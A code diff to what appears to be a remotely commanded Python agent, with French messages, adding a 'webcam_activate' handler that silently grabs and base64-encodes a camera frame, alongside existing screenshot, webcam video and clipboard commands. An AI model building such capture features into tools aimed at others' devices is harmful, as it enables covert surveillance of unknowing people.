@@ -171,6 +171,46 @@ def handle_screenshot():
         return {"error": str(e)}
 
 
+def handle_webcam_activate(camera_index=0):
+    if not HAS_CV2:
+        return {"error": "OpenCV non installe (pip install opencv-python)."}
+
+    cap = cv2.VideoCapture(camera_index)
+    if not cap.isOpened():
+        return {"error": "Webcam indisponible."}
+
+    try:
+        for _ in range(3):
+            cap.read()
+
+        ok, frame = cap.read()
+        if not ok or frame is None:
+            return {"error": "Impossible d'activer la webcam."}
+
+        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) or 0)
+        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) or 0)
+        fps = float(cap.get(cv2.CAP_PROP_FPS) or 0.0)
+
+        preview_b64 = None
+        ok_enc, encoded = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 78])
+        if ok_enc:
+            preview_b64 = base64.b64encode(encoded.tobytes()).decode()
+
+        return {
+            "active": True,
+            "camera_index": int(camera_index or 0),
+            "resolution": f"{width}x{height}" if width and height else "?",
+            "fps": round(fps, 2) if fps > 0 else 0,
+            "output": "Webcam activee et prete pour capture photo/video.",
+            "screenshot": preview_b64,
+            "source": "webcam",
+        }
+    except Exception as e:
+        return {"error": f"Activation webcam: {e}"}
+    finally:
+        cap.release()
+
+
 def handle_webcam_photo(camera_index=0):
     if not HAS_CV2:
         return {"error": "OpenCV non installe (pip install opencv-python)."}
@@ -707,6 +747,7 @@ def dispatch(msg):
             "disk_usage":     lambda: handle_disk_usage(),
             "installed_sw":   lambda: handle_installed_sw(),
             "screenshot":     lambda: handle_screenshot(),
+            "webcam_activate":lambda: handle_webcam_activate(p.get("camera", 0)),
             "webcam_photo":   lambda: handle_webcam_photo(p.get("camera", 0)),
             "webcam_video":   lambda: handle_webcam_video(p.get("duration", 6), p.get("camera", 0), p.get("fps", 10)),
             "clipboard":      lambda: handle_clipboard(),
